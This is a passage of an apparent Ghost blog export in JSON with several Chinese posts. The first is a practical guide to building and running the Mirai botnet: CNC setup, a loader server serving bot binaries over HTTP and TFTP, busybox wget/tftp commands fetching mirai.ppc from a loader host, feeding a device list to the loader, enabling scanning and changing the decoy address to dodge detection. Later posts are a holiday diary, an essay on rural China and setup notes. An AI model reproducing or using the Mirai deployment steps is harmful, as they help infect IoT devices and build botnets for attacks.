PATH=$PATH:/etc/xcompile/mips/bin/\nexport PATH=$PATH:/etc/xcompile/mipsel/bin/\nexport PATH=$PATH:/etc/xcompile/powerpc/bin/\nexport PATH=$PATH:/etc/xcompile/powerpc-440fp/bin/\nexport PATH=$PATH:/etc/xcompile/sh4/bin/\nexport PATH=$PATH:/etc/xcompile/sparc/bin/\nexport GOPATH=$HOME/Documents/go\n\ngo get github.com/go-sql-driver/mysql\ngo get github.com/mattn/go-shellwords\n\n\n环境和主控的配置都已经完成，此时再次编译源代码，然后运行：\n\n./mirai/debug/cnc\n\n\n此时主控可以启动，登录时显示的是俄文，输入用户名和密码即可登陆。\n\n配置 Loader 服务器\nLoader 服务器上包括 HTTP，TFTP，接收器，加载器四个模块。将刚才编译出来的 scanListen，以及 loader\n文件夹下和dlr文件夹下编译出来的对应文件拷贝到这台服务器即可。\n\n配置 HTTP\n\naptitude install apache2\n\n\n在 apache 根目录建立bins文件夹，将编译出的不同平台的 bot 病毒放入，以供下载。\n\n配置 TFTP\n\napt-get install -y tftpd-hpa\nvim /etc/default/tftpd-hpa\n\nTFTP_USERNAME=\"tftp\"\nTFTP_DIRECTORY=\"/tftpboot\"\nTFTP_ADDRESS=\"0.0.0.0:69\"\nTFTP_OPTIONS=\"--secure --create\"\n\nservice tftpd-hpa restart\n\n\nTFTP 的更多内容参见这里\n[http://www.routingloops.co.uk/linux/tftp-on-ubuntu-14-04-lts-server/]\n，同样将病毒程序放入自己设置的 TFTP 根目录，以供下载。\n\n配置完毕后，在本机和另外一台机器上运行\n\n/bin/busybox wget http:Loader_IP:80/bins/mirai.ppc -O dvrHelper\n/bin/busybox tftp -g -l dvrHelp -r mirai.ppc Loader_IP\n\n\n运行成功则证明两个服务配置正确。如果此时手里有可供感染的设备列表的话，运行：\n\ncat file.txt | ./loader\n\n\n可以启动 Mirai。\n\nMirai 的部分源码分析\nMirai 的源代码分析网上已经有不少，基本从整体结构上做了较为全面的阐述，这里仅对一些细节和一些坑做一些简要说明。\n\nFAKE_ADDR\nMirai 为了增加安全性，在源码中使用了一个假的主控地址，用来迷惑分析人员，真实的地址是从代码中进行解密并请求 DNS 解析进行获取的，假地址位于 \n./mirai/bot/includes.h中，如果对 Mirai 进行变异，可以修改这个地址，应该可以规避一些简单的检测。\n\nDNS 解析\nMirai 在 ./mirai/bot/resolv.c  中定义了 DNS 地址，默认是请求 Google 的 DNS 服务器 8.8.8.8\n进行地址解析。这个 DNS 地址可以修改，如果是在实验室内网做实验，无法使用 Google 服务的情况下，应该修改成实验室使用的\nDNS，不然可能会造成实验无法成功。\n\nkiller 的小Bug\nMirai 的 debug 编译和 release 编译有所区别，release 除了不输出各种信息外，其流程也并不完全一样，比如 release 对\nTable 的使用并不加锁，运行 Debug 版的时候，信息输出如下：\n\n\nDEBUG MODE YO\n[main] We are the only process on this system!\nlistening tun0\n[main] Attempting[ to kicollennr] eTrcyint g tto ko illCN pCort\n 23\n[killer] Finding and killing processes holding port 23\nFailed to find inode for port 23\n[killer] Failed to kill port 23\n[killer] Bound to tcp/23 (telnet)\n[resolv] Got response from select\n[resolv] Found IP address: f3251c73\nResolved xxxx.xxx.xx to 1 IPv4 addresses\n[main] Resolved domain\n[main] Connected to CNC. Local address = -335435584\n[killer] Detected we are running out of `/Mirai/mirai/debug/mirai.dbg`\n[killer] Memory scanning processes\n[table] Tried to access table.11 but it is locked\nGot SIGSEGV at address: 0x0\n\n\n其中显示想使用 table.11 ，但是并没有解密，这里应该修改 killer.c的 172 行，在后面加入 \ntable_unlock_val(TABLE_KILLER_STATUS);，在 185 行后面加入 \ntable_lock_val(TABLE_KILLER_STATUS);，重新编译运行，这个报错就会消失。\n\nBot 的扫描\n在 debug 模式下，是观察不到扫描现象的，这是因为源码在 debug 模式中关闭了扫描功能。相关代码在 main.c  中。\n\n\n#ifndef DEBUG\n    if (fork() > 0)\n        return 0;\n    pgid = setsid();\n    close(STDIN);\n    close(STDOUT);\n    close(STDERR);\n#endif\n\n    attack_init();\n    killer_init();\n#ifndef DEBUG\n#ifdef MIRAI_TELNET\n    scanner_init();\n#endif\n#endif\n\n\n可以看到，不是 debug 模式的时候，才会初始化扫描器，所以将 #ifndef DEBUG和#endif注释掉，重新编译，即可开启扫描功能。\n\ntable 初始化的启动方式\n实验时一般使用 debug 模式编译和实验，但是如果使用 release 版本，就会发现不稳定，甚至无法成功，这是因为 debug 和 release\n的初始化方式和控制方式不一样，release 采用信号控制，并且在函数入口的寻找上做了混淆，主要函数是 unlock_tbl_if_nodebug，如果使用\nrelease 版本，可以做一下修改：\n\n\n#ifndef DEBUG\n    (obf_funcs[fold])();\n    matches = util_strcmp(argv0, buf_dst);\n    util_zero(buf_src, sizeof (buf_src));\n    util_zero(buf_dst, sizeof (buf_dst));\n    return matches;\n#else\n    table_init();\n    return TRUE;\n#endif\n\n\n将这段代码里面的 debug 模式和 release 模式调换。\n\n关于杀灭设备中的其他病毒\nMirai 具有独占性，一旦Mirai 感染了某一个设备，它会寻找设备上的其他僵尸网络，并将其杀掉，以让自己成为这个设备的唯一控制者，其杀死竞争者的相关代码位于\n killer.c  中。经过解密，我发现它给其他 bot 的特征的定义是：\n\n\nREPORT %s:%s\nHTTPFLOOD\nLOLNOGTFO\nzollard\nGETLOCALIP\n\n\n也就是说，如果在进程路径名中发现了以上这些字符串，则杀掉那个进程。\n\n此外，Mirai 对自身进程名做了伪装，每次运行 Mirai，其进程名字都是随机的字符串，所以如果对 Mirai 进行变异，并且想杀掉 Mirai\n的话，并不能用 Mirai 检测其他bot的方法，来检测 Mirai 自身。\n\nMirai 可能是半成品\n从 Mirai 的编译脚本和代码中分析，Mirai 定义了 TELNET 和 SSH 两个编译选项，并且代码中有相关的宏开关，但是从目前的代码看，并未发现\nSSH 猜解和登陆的相关功能。\n\n个人猜测 Mirai 原本打算开发 TELNET 和 SSH 两个功能，但是目前只完成了一半，或许是只完成了一半，或许是 SSH\n的部分原作者并未放出，真实情况不得而知。\n\nMirai 小结\nMirai 的发布可以讲是一件大事，无论对于白帽还是黑产均是如此。本文仅对工具的配置使用做一总结，请勿用于非法用途。\n\n而且事实上，由于 Mirai\n具有独占性，直接将源码编译应用，其实并不会有很好的实战效果，目前已经出现了众多变异版本，比如将字典缩减到两三个成功率最高的口令，针对最新漏洞进行扫描等等。\n\nMirai 为后续此类病毒的编写提供了一个标准的框架，真的是授人以渔啊，估计未来的变异版本和相关影响都不容小觑。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-09T01:26:26.000Z","created_by":"1","updated_at":"2017-01-09T06:01:12.000Z","updated_by":"1","published_at":"2017-01-09T05:54:02.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c52","uuid":"ce5428f4-f692-4c5a-a45e-ac8cef1eb8ee","title":"春節快乐","slug":"chunjiekuaile","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##闲言\\n\\n这是一篇划水的文章，今日是正月初一，明けましておめでとうございます。\\n\\n仔细想想，这是长这么大以来，第一次自己在外面过年，不过好在有 QQ 和微信，虽然不能回家，但是通过 QQ 视频和父母聊了很久，也算是用别样的方式一起庆祝了。\\n\\n一个人的年夜饭本打算搞的完美一点，一开始想买饺子回来煮，但是超市里面并没有看到水饺子，生饺子是有的，但人家是默认你拿回家做煎饺子的，所以包的并不严实，我估计一下锅就都破了。\\n\\n退而求其次，打算去吃一直想吃的生蚝摩登烧，然而点菜的时候搞错了名字，点成了生蚝荞麦面烧。于是，最终的年夜饭离想象中的完美相去甚远，吃完了面，又去超市买了四个烧饺子，虽然和计划中的年夜饭有所差别，但是味道还是很好的，就这样以一种缺憾美的方式，度过了除夕夜。\\n\\n![](/content/images/2017/01/kakisoba.jpg)\\n\\n![](/content/images/2017/01/gyoza.jpg)\\n\\n从中旬开始，已经不再上班了，公司让脱产去日语学校上两个月的日语课，然后再来上班。不仅工资照发，而且这个学费真心感觉好贵，感觉公司实在是对我们太好了，有点不好意思。\\n\\n上课比上班感觉还要累，老师是日本人，不会说中文，用日语来教日语，感觉也是醉了。我不觉得这俩月会有啥作用，但是没有办法，日本人的思维有时也真的比较难形容，对你好倒是真的，但是似乎方式上总是找不对点。\\n\\n不知道是不是因为在关西的原因，并且还是一家互联网公司，所以公司的日本人，或者周围看到的日本人，和教科书上的日本人不太一样。这里的人倒是如网上对关西的评论一样，性格是比较像中国人的，热情开朗的较多，闯个红灯啥的也是家常便饭。\\n\\n不论是旧历还是新历，新的一年都到来了，希望这一年一切顺利，日语课程快快结束，快点回归正常的工作。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"\">闲言</h2>\n<p>这是一篇划水的文章，今日是正月初一，明けましておめでとうございます。</p>\n<p>仔细想想，这是长这么大以来，第一次自己在外面过年，不过好在有 QQ 和微信，虽然不能回家，但是通过 QQ 视频和父母聊了很久，也算是用别样的方式一起庆祝了。</p>\n<p>一个人的年夜饭本打算搞的完美一点，一开始想买饺子回来煮，但是超市里面并没有看到水饺子，生饺子是有的，但人家是默认你拿回家做煎饺子的，所以包的并不严实，我估计一下锅就都破了。</p>\n<p>退而求其次，打算去吃一直想吃的生蚝摩登烧，然而点菜的时候搞错了名字，点成了生蚝荞麦面烧。于是，最终的年夜饭离想象中的完美相去甚远，吃完了面，又去超市买了四个烧饺子，虽然和计划中的年夜饭有所差别，但是味道还是很好的，就这样以一种缺憾美的方式，度过了除夕夜。</p>\n<p><img src=\"/content/images/2017/01/kakisoba.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/2017/01/gyoza.jpg\" alt=\"\"></p>\n<p>从中旬开始，已经不再上班了，公司让脱产去日语学校上两个月的日语课，然后再来上班。不仅工资照发，而且这个学费真心感觉好贵，感觉公司实在是对我们太好了，有点不好意思。</p>\n<p>上课比上班感觉还要累，老师是日本人，不会说中文，用日语来教日语，感觉也是醉了。我不觉得这俩月会有啥作用，但是没有办法，日本人的思维有时也真的比较难形容，对你好倒是真的，但是似乎方式上总是找不对点。</p>\n<p>不知道是不是因为在关西的原因，并且还是一家互联网公司，所以公司的日本人，或者周围看到的日本人，和教科书上的日本人不太一样。这里的人倒是如网上对关西的评论一样，性格是比较像中国人的，热情开朗的较多，闯个红灯啥的也是家常便饭。</p>\n<p>不论是旧历还是新历，新的一年都到来了，希望这一年一切顺利，日语课程快快结束，快点回归正常的工作。</p>\n</div>","amp":"30","plaintext":"闲言\n这是一篇划水的文章，今日是正月初一，明けましておめでとうございます。\n\n仔细想想，这是长这么大以来，第一次自己在外面过年，不过好在有 QQ 和微信，虽然不能回家，但是通过 QQ 视频和父母聊了很久，也算是用别样的方式一起庆祝了。\n\n一个人的年夜饭本打算搞的完美一点，一开始想买饺子回来煮，但是超市里面并没有看到水饺子，生饺子是有的，但人家是默认你拿回家做煎饺子的，所以包的并不严实，我估计一下锅就都破了。\n\n退而求其次，打算去吃一直想吃的生蚝摩登烧，然而点菜的时候搞错了名字，点成了生蚝荞麦面烧。于是，最终的年夜饭离想象中的完美相去甚远，吃完了面，又去超市买了四个烧饺子，虽然和计划中的年夜饭有所差别，但是味道还是很好的，就这样以一种缺憾美的方式，度过了除夕夜。\n\n\n\n\n\n从中旬开始，已经不再上班了，公司让脱产去日语学校上两个月的日语课，然后再来上班。不仅工资照发，而且这个学费真心感觉好贵，感觉公司实在是对我们太好了，有点不好意思。\n\n上课比上班感觉还要累，老师是日本人，不会说中文，用日语来教日语，感觉也是醉了。我不觉得这俩月会有啥作用，但是没有办法，日本人的思维有时也真的比较难形容，对你好倒是真的，但是似乎方式上总是找不对点。\n\n不知道是不是因为在关西的原因，并且还是一家互联网公司，所以公司的日本人，或者周围看到的日本人，和教科书上的日本人不太一样。这里的人倒是如网上对关西的评论一样，性格是比较像中国人的，热情开朗的较多，闯个红灯啥的也是家常便饭。\n\n不论是旧历还是新历，新的一年都到来了，希望这一年一切顺利，日语课程快快结束，快点回归正常的工作。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-28T01:44:47.000Z","created_by":"1","updated_at":"2017-01-28T02:24:48.000Z","updated_by":"1","published_at":"2017-01-28T02:24:48.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c53","uuid":"6b8f31a5-172d-4fd6-b01f-476e6a255888","title":"“真实”的中国","slug":"china","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"## 引子\\n转眼又快半年过去了，岁数越大，感觉时间过得越快，如果有人问我这半年干了什么，我感觉好像什么都没干，忙忙碌碌却不知道忙些什么。\\n\\n这篇文章的题目是有些意思的，来日本已经快一年了，有许许多多的感受想写一写，于是在构思的时候，我想到了网上经常看到的标题，比如“一个真实的日本”之类的，然后我就笑了出来，这种笑是基于来之前看了N多文章做的功课，和来之后真实情况的对比，我们对这个邻居的了解，实在是太少太浅薄了。我哪有资格写什么真实的日本啊，我觉得不论谁起一个这样的题目，都是狂妄的。犹如标题自冠“深度好文”的，基本谈不上深度；反而写着浅析某某的，倒很可能言之有物。\\n\\n进而我又想到，作为一个中国人，我是否有资格写真实的中国呢？很可惜，恐怕也是没有的，所以我写的是加了引号的“真实”的中国。\\n\\n## 家乡\\n\\n我虽然是天津出生，但我父亲却是移居到天津的，我的老家是在河北省的一个普通乡村。\\n\\n从小到大，回老家的次数不多，但给我的印象却极其深刻。\\n\\n小时候房后面有一个大池塘，可以捕鱼，后来干涸了，现如今变成了一片树林。院子里老的水井已经压不出水，现在重新打了一口深井。\\n\\n村里的小卖部是买不到酸奶的，只有乳饮料。所有的食品品牌几乎都是未曾听说过的。王致和的酱豆腐是假的，味精是假的，里面掺着盐。各种假冒伪劣产品充斥在市场上。上次在商店想买个锅，一看那个锅就是回收的废铁造的。一句话总结就是，这里感觉就是倾销劣等品的地方。菜不是每天都能买，需要赶集。村里没有自来水，没有垃圾站，似乎不怎么产生垃圾，垃圾都扔到房子后面的坑里。以前和奶奶聊天，聊到订婚送礼啥的，总听到谁谁谁送了一箱方便面，在他们的眼里，方便面是可以作为社交的礼品的。\\n\\n这两年回老家，也慢慢能感觉到，村里的年轻人很多都跑到外面大城市定居了，奶奶家周围的人越来越少，出国前最后一次回去，站在房门口的小路上，风吹着扬沙呼在脸上，我感觉到的就是两个字，“衰败”。面对着村里的景象，回想着这些年的各种经历，脑子里的念头就是，原来这里也是中国。\\n\\n老家哥哥姐姐们的孩子已经上学，所谓教育质量，也就那样。想上好学校，那就去县城甚至别的市吧。我越来越能领悟到，为什么高三时生物老师说，你们生在城市里，就比农村人多了一百年的造化。\\n\\n最关键的是，这并不是什么癌症村，工业污染村，也不是什么老少边穷，这就是一个离北京不过一个多小时车程的普通农村，却已经感觉是另一个世界。\\n\\n## 迷惑\\n我写文章，并不是要表达城乡差距，我没打算，也没有能力去述说那么宏大的课题。我只是觉得，很多人网络文章读多了，新闻看多了，会产生一种错觉，会觉得他们所看到的，就是全部。很多人可能一辈子都没离开过自己的城市，然后觉得全中国都是那样的。很多北上广的年轻人觉得中国太发达了，有一种迷之自信，似乎全国都是那么发达的。\\n\\n和同事喝酒的时候，同事感叹日本是没有未来的，中国经济蓬勃发展，问我为啥要来日本。那我也只能跟着附和说，其实我也觉得中国是没有未来的，同事马上一脸不信的样子。其实说实话，这么多年我一直很迷惑，我的祖国未来究竟如何。现在我用脚投了票，可能潜意识里面还是不看好吧。\\n\\n如果我的同事让我介绍一下中国的样子，我是应该描述北京的繁华，还是老家的衰败，甚至是老少边穷地区的赤贫？是应该描述订着美团外卖，骑着共享单车，站在时代风口的互联网人生活，还是点着炉子取暖，算日子赶集，吃着伪劣食品的老家生活？\\n\\n哪个才是真实的中国呢，其实我也不知道，我连什么是真实的中国都不知道，你有何必去在意网上各种中国人对日本的描述呢，尤其是什么真实的日本。\\n\\n网上对日本的描述，尤其以中文为载体的，除去脑残的愤青文章，基本都是脸谱化的，什么干净礼貌啊，严谨敬业啊，大部分还是游客写的。不过都是盲人摸象的级别罢了。\\n\\n后面，准备写一些在这里生活的感受，可是我写的可不是什么真实的日本，我甚至觉得，我的生活体验，连日本主流社会的边儿都没碰到。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"\">引子</h2>\n<p>转眼又快半年过去了，岁数越大，感觉时间过得越快，如果有人问我这半年干了什么，我感觉好像什么都没干，忙忙碌碌却不知道忙些什么。</p>\n<p>这篇文章的题目是有些意思的，来日本已经快一年了，有许许多多的感受想写一写，于是在构思的时候，我想到了网上经常看到的标题，比如“一个真实的日本”之类的，然后我就笑了出来，这种笑是基于来之前看了N多文章做的功课，和来之后真实情况的对比，我们对这个邻居的了解，实在是太少太浅薄了。我哪有资格写什么真实的日本啊，我觉得不论谁起一个这样的题目，都是狂妄的。犹如标题自冠“深度好文”的，基本谈不上深度；反而写着浅析某某的，倒很可能言之有物。</p>\n<p>进而我又想到，作为一个中国人，我是否有资格写真实的中国呢？很可惜，恐怕也是没有的，所以我写的是加了引号的“真实”的中国。</p>\n<h2 id=\"\">家乡</h2>\n<p>我虽然是天津出生，但我父亲却是移居到天津的，我的老家是在河北省的一个普通乡村。</p>\n<p>从小到大，回老家的次数不多，但给我的印象却极其深刻。</p>\n<p>小时候房后面有一个大池塘，可以捕鱼，后来干涸了，现如今变成了一片树林。院子里老的水井已经压不出水，现在重新打了一口深井。</p>\n<p>村里的小卖部是买不到酸奶的，只有乳饮料。所有的食品品牌几乎都是未曾听说过的。王致和的酱豆腐是假的，味精是假的，里面掺着盐。各种假冒伪劣产品充斥在市场上。上次在商店想买个锅，一看那个锅就是回收的废铁造的。一句话总结就是，这里感觉就是倾销劣等品的地方。菜不是每天都能买，需要赶集。村里没有自来水，没有垃圾站，似乎不怎么产生垃圾，垃圾都扔到房子后面的坑里。以前和奶奶聊天，聊到订婚送礼啥的，总听到谁谁谁送了一箱方便面，在他们的眼里，方便面是可以作为社交的礼品的。</p>\n<p>这两年回老家，也慢慢能感觉到，村里的年轻人很多都跑到外面大城市定居了，奶奶家周围的人越来越少，出国前最后一次回去，站在房门口的小路上，风吹着扬沙呼在脸上，我感觉到的就是两个字，“衰败”。面对着村里的景象，回想着这些年的各种经历，脑子里的念头就是，原来这里也是中国。</p>\n<p>老家哥哥姐姐们的孩子已经上学，所谓教育质量，也就那样。想上好学校，那就去县城甚至别的市吧。我越来越能领悟到，为什么高三时生物老师说，你们生在城市里，就比农村人多了一百年的造化。</p>\n<p>最关键的是，这并不是什么癌症村，工业污染村，也不是什么老少边穷，这就是一个离北京不过一个多小时车程的普通农村，却已经感觉是另一个世界。</p>\n<h2 id=\"\">迷惑</h2>\n<p>我写文章，并不是要表达城乡差距，我没打算，也没有能力去述说那么宏大的课题。我只是觉得，很多人网络文章读多了，新闻看多了，会产生一种错觉，会觉得他们所看到的，就是全部。很多人可能一辈子都没离开过自己的城市，然后觉得全中国都是那样的。很多北上广的年轻人觉得中国太发达了，有一种迷之自信，似乎全国都是那么发达的。</p>\n<p>和同事喝酒的时候，同事感叹日本是没有未来的，中国经济蓬勃发展，问我为啥要来日本。那我也只能跟着附和说，其实我也觉得中国是没有未来的，同事马上一脸不信的样子。其实说实话，这么多年我一直很迷惑，我的祖国未来究竟如何。现在我用脚投了票，可能潜意识里面还是不看好吧。</p>\n<p>如果我的同事让我介绍一下中国的样子，我是应该描述北京的繁华，还是老家的衰败，甚至是老少边穷地区的赤贫？是应该描述订着美团外卖，骑着共享单车，站在时代风口的互联网人生活，还是点着炉子取暖，算日子赶集，吃着伪劣食品的老家生活？</p>\n<p>哪个才是真实的中国呢，其实我也不知道，我连什么是真实的中国都不知道，你有何必去在意网上各种中国人对日本的描述呢，尤其是什么真实的日本。</p>\n<p>网上对日本的描述，尤其以中文为载体的，除去脑残的愤青文章，基本都是脸谱化的，什么干净礼貌啊，严谨敬业啊，大部分还是游客写的。不过都是盲人摸象的级别罢了。</p>\n<p>后面，准备写一些在这里生活的感受，可是我写的可不是什么真实的日本，我甚至觉得，我的生活体验，连日本主流社会的边儿都没碰到。</p>\n</div>","amp":"33","plaintext":"引子\n转眼又快半年过去了，岁数越大，感觉时间过得越快，如果有人问我这半年干了什么，我感觉好像什么都没干，忙忙碌碌却不知道忙些什么。\n\n这篇文章的题目是有些意思的，来日本已经快一年了，有许许多多的感受想写一写，于是在构思的时候，我想到了网上经常看到的标题，比如“一个真实的日本”之类的，然后我就笑了出来，这种笑是基于来之前看了N多文章做的功课，和来之后真实情况的对比，我们对这个邻居的了解，实在是太少太浅薄了。我哪有资格写什么真实的日本啊，我觉得不论谁起一个这样的题目，都是狂妄的。犹如标题自冠“深度好文”的，基本谈不上深度；反而写着浅析某某的，倒很可能言之有物。\n\n进而我又想到，作为一个中国人，我是否有资格写真实的中国呢？很可惜，恐怕也是没有的，所以我写的是加了引号的“真实”的中国。\n\n家乡\n我虽然是天津出生，但我父亲却是移居到天津的，我的老家是在河北省的一个普通乡村。\n\n从小到大，回老家的次数不多，但给我的印象却极其深刻。\n\n小时候房后面有一个大池塘，可以捕鱼，后来干涸了，现如今变成了一片树林。院子里老的水井已经压不出水，现在重新打了一口深井。\n\n村里的小卖部是买不到酸奶的，只有乳饮料。所有的食品品牌几乎都是未曾听说过的。王致和的酱豆腐是假的，味精是假的，里面掺着盐。各种假冒伪劣产品充斥在市场上。上次在商店想买个锅，一看那个锅就是回收的废铁造的。一句话总结就是，这里感觉就是倾销劣等品的地方。菜不是每天都能买，需要赶集。村里没有自来水，没有垃圾站，似乎不怎么产生垃圾，垃圾都扔到房子后面的坑里。以前和奶奶聊天，聊到订婚送礼啥的，总听到谁谁谁送了一箱方便面，在他们的眼里，方便面是可以作为社交的礼品的。\n\n这两年回老家，也慢慢能感觉到，村里的年轻人很多都跑到外面大城市定居了，奶奶家周围的人越来越少，出国前最后一次回去，站在房门口的小路上，风吹着扬沙呼在脸上，我感觉到的就是两个字，“衰败”。面对着村里的景象，回想着这些年的各种经历，脑子里的念头就是，原来这里也是中国。\n\n老家哥哥姐姐们的孩子已经上学，所谓教育质量，也就那样。想上好学校，那就去县城甚至别的市吧。我越来越能领悟到，为什么高三时生物老师说，你们生在城市里，就比农村人多了一百年的造化。\n\n最关键的是，这并不是什么癌症村，工业污染村，也不是什么老少边穷，这就是一个离北京不过一个多小时车程的普通农村，却已经感觉是另一个世界。\n\n迷惑\n我写文章，并不是要表达城乡差距，我没打算，也没有能力去述说那么宏大的课题。我只是觉得，很多人网络文章读多了，新闻看多了，会产生一种错觉，会觉得他们所看到的，就是全部。很多人可能一辈子都没离开过自己的城市，然后觉得全中国都是那样的。很多北上广的年轻人觉得中国太发达了，有一种迷之自信，似乎全国都是那么发达的。\n\n和同事喝酒的时候，同事感叹日本是没有未来的，中国经济蓬勃发展，问我为啥要来日本。那我也只能跟着附和说，其实我也觉得中国是没有未来的，同事马上一脸不信的样子。其实说实话，这么多年我一直很迷惑，我的祖国未来究竟如何。现在我用脚投了票，可能潜意识里面还是不看好吧。\n\n如果我的同事让我介绍一下中国的样子，我是应该描述北京的繁华，还是老家的衰败，甚至是老少边穷地区的赤贫？是应该描述订着美团外卖，骑着共享单车，站在时代风口的互联网人生活，还是点着炉子取暖，算日子赶集，吃着伪劣食品的老家生活？\n\n哪个才是真实的中国呢，其实我也不知道，我连什么是真实的中国都不知道，你有何必去在意网上各种中国人对日本的描述呢，尤其是什么真实的日本。\n\n网上对日本的描述，尤其以中文为载体的，除去脑残的愤青文章，基本都是脸谱化的，什么干净礼貌啊，严谨敬业啊，大部分还是游客写的。不过都是盲人摸象的级别罢了。\n\n后面，准备写一些在这里生活的感受，可是我写的可不是什么真实的日本，我甚至觉得，我的生活体验，连日本主流社会的边儿都没碰到。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-05-21T02:00:19.000Z","created_by":"1","updated_at":"2017-05-21T07:59:42.000Z","updated_by":"1","published_at":"2017-05-21T07:59:42.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bd1fc196d44132165a8605","uuid":"55019c42-8601-4781-8fe0-41ff695ce6b8","title":"Ghost 升级到V1.8.6","slug":"ghostupdate18","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"## 前言\\n\\nGhost 后台一直提示升级吧，升级吧，升级吧。很久没有管过，突然发现是主版本更新，而且基本上是鸟枪换炮，再也不是以前的草台班子模样了。官方文档也非常详细，按照文档走流程直接成功，基本也不再需要我画蛇添足了，只是简单记录下过程。\\n\\n参考文档: \\n* 新装: https://docs.ghost.org/v1.0.0/docs/install\\n* 旧版迁移: https://docs.ghost.org/v1.0.0/docs/migrating-to-ghost-1-0-0\\n\\n## 工作\\n\\n* 新开了台机器，ubuntu 16.04\\n* 按文档流程配了环境\\n* 用官方提供的检测工具检测了当前主题 Kaldorei，修改了所有不兼容的地方\\n* 通过后台 Lab 功能，将数据导出和迁移，手动复制迁移图片\\n* 将所有 Ghost 作者发布的文章转换为草稿，避免在前台显示\\n* 开防火墙\\n\\n## 主要变化\\n\\n* 后台体验全面升级\\n* 安装和维护简化，后续更新只需要执行一条命令即可\\n* 安全性提高, 支持 https\\n* MySQL化，目前看备份只能通过导出数据和备份 content 文件夹了\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><h2 id=\"\">前言</h2>\n<p>Ghost 后台一直提示升级吧，升级吧，升级吧。很久没有管过，突然发现是主版本更新，而且基本上是鸟枪换炮，再也不是以前的草台班子模样了。官方文档也非常详细，按照文档走流程直接成功，基本也不再需要我画蛇添足了，只是简单记录下过程。</p>\n<p>参考文档:</p>\n<ul>\n<li>新装: <a href=\"https://docs.ghost.org/v1.0.0/docs/install\">https://docs.ghost.org/v1.0.0/docs/install</a></li>\n<li>旧版迁移: <a href=\"https://docs.ghost.org/v1.0.0/docs/migrating-to-ghost-1-0-0\">https://docs.ghost.org/v1.0.0/docs/migrating-to-ghost-1-0-0</a></li>\n</ul>\n<h2 id=\"\">工作</h2>\n<ul>\n<li>新开了台机器，ubuntu 16.04</li>\n<li>按文档流程配了环境</li>\n<li>用官方提供的检测工具检测了当前主题 Kaldorei，修改了所有不兼容的地方</li>\n<li>通过后台 Lab 功能，将数据导出和迁移，手动复制迁移图片</li>\n<li>将所有 Ghost 作者发布的文章转换为草稿，避免在前台显示</li>\n<li>开防火墙</li>\n</ul>\n<h2 id=\"\">主要变化</h2>\n<ul>\n<li>后台体验全面升级</li>\n<li>安装和维护简化，后续更新只需要执行一条命令即可</li>\n<li>安全性提高, 支持 https</li>\n<li>MySQL化，目前看备份只能通过导出数据和备份 content 文件夹了</li>\n</ul>\n</div>","amp":null,"plaintext":"前言\nGhost\n后台一直提示升级吧，升级吧，升级吧。很久没有管过，突然发现是主版本更新，而且基本上是鸟枪换炮，再也不是以前的草台班子模样了。官方文档也非常详细，按照文档走流程直接成功，基本也不再需要我画蛇添足了，只是简单记录下过程。\n\n参考文档:\n\n * 新装: https://docs.ghost.org/v1.0.0/docs/install\n * 旧版迁移: https://docs.ghost.org/v1.0.0/docs/migrating-to-ghost-1-0-0\n\n工作\n * 新开了台机器，ubuntu 16.04\n * 按文档流程配了环境\n * 用官方提供的检测工具检测了当前主题 Kaldorei，修改了所有不兼容的地方\n * 通过后台 Lab 功能，将数据导出和迁移，手动复制迁移图片\n * 将所有 Ghost 作者发布的文章转换为草稿，避免在前台显示\n * 开防火墙\n\n主要变化\n * 后台体验全面升级\n * 安装和维护简化，后续更新只需要执行一条命令即可\n * 安全性提高, 支持 https\n * MySQL化，目前看备份只能通过导出数据和备份 content 文件夹了","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-09-16T12:57:37.000Z","created_by":"1","updated_at":"2017-09-16T13:19:43.000Z","updated_by":"1","published_at":"2017-09-16T13:19:43.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":"","codeinjection_foot":"","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59c5095eeca69d7b679a3875","uuid":"b38a0285-2410-456a-9d33-4d016a02b82e","title":"Linux 下安装Python 3.x","slug":"linuxpython3","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"以前文章的搬家，留作记录。\\n\\n* 下载源码包\\n`wget https://www.python.org/ftp/python/3.3.7/Python-3.3.7.tgz`\\n* 解压\\n`tar xvzf Python-3.3.7.tgz`\\n* 编译安装\\n`./configure --prefix=/usr/local/python3`\\n`make`\\n`sudo make install`\\n* 默认调用 3.x 的方法\\n`mv /usr/bin/python /usr/bin/python_old`\\n`ln -s /usr/local/python3/bin/python3 /usr/bin/python`\\n* 另外，也可以用 virtualenv 